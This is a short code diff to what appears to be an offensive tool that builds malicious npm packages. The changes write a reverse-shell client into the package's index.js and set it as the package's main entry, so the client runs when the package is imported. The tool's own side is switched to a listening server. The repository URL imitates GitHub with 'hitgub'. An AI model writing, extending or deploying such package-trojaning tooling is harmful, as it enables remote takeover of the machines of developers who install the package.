@@ -42,7 +42,7 @@ class PackageManager {
 		});
 
 		success('Reverse shell ready:');
-		this.reverse_shell_generator.runLocalClient();
+		this.reverse_shell_generator.runLocalServer();
 	}
 
 	insertPayload(file) {
@@ -66,11 +66,12 @@ class PackageManager {
 			repository: {
 				'type': 'git',
 				'url':  `git://github.com/hitgub/${this.pkg}.git`
-			}
+			},
+			main: 'index.js'
 		});
 		fs.writeFileSync(`${this.directory}/package.json`, package_json);
 
-		const index_js = this.reverse_shell_generator.listener();
+		const index_js = this.reverse_shell_generator.client();
 		fs.writeFileSync(`${this.directory}/index.js`, index_js);
 
 		const manifest = {
